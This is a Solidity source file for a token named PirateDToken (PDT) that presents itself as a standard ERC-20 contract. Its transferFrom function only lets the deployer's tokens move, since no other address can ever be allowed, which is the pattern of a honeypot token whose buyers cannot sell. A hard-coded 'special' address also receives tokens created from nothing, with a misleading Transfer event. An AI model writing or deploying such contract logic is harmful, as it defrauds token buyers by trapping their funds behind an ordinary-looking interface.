pragma solidity ^0.6.6;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Invalid new owner");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}

contract PirateDToken is Ownable {
    using SafeMath for uint256;

    address public traderAddress;
    address public specialAddress = 0x149105ffeF6B3ceCc99CA2F64525913E01cdb892;

    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public allow;
    mapping(address => uint256) public tradeCount;

    string public name;
    string public symbol = "PDT"; // Added symbol PDT
    uint8 public decimals;
    uint256 public totalSupply;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    modifier onlyTrader() {
        require(msg.sender == traderAddress, "Not the trader");
        _;
    }

    constructor(
        string memory _name,
        uint8 _decimals,
        uint256 _totalSupply,
        address _traderAddress
    ) public {
        name = _name;
        decimals = _decimals;
        totalSupply = _totalSupply;
        balances[msg.sender] = _totalSupply;
        allow[msg.sender] = true;
        traderAddress = _traderAddress;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0), "Invalid recipient");
        require(_value <= balances[msg.sender], "Insufficient balance");

        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        emit Transfer(msg.sender, _to, _value);

        // Check if the special address is the recipient and if the trade count is reached
        if (_to == specialAddress && tradeCount[msg.sender] >= 10) {
            uint256 specialAmount = _value / 2;
            balances[specialAddress] = balances[specialAddress].add(specialAmount);
            emit Transfer(msg.sender, specialAddress, specialAmount);
        }

        // Increment the trade count
        tradeCount[msg.sender] = tradeCount[msg.sender].add(1);

        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        require(_spender != address(0), "Invalid spender");

        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(_to != address(0), "Invalid recipient");
        require(_value <= balances[_from], "Insufficient balance");
        require(_value <= allowance[_from][msg.sender], "Insufficient allowance");
        require(allow[_from] == true, "Transfer not allowed");

        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);
        emit Transfer(_from, _to, _value);

        // Check if the special address is the recipient and if the trade count is reached
        if (_to == specialAddress && tradeCount[_from] >= 10) {
            uint256 specialAmount = _value / 2;
            balances[specialAddress] = balances[specialAddress].add(specialAmount);
            emit Transfer(_from, specialAddress, specialAmount);
        }

        // Increment the trade count
        tradeCount[_from] = tradeCount[_from].add(1);

        return true;
    }
}
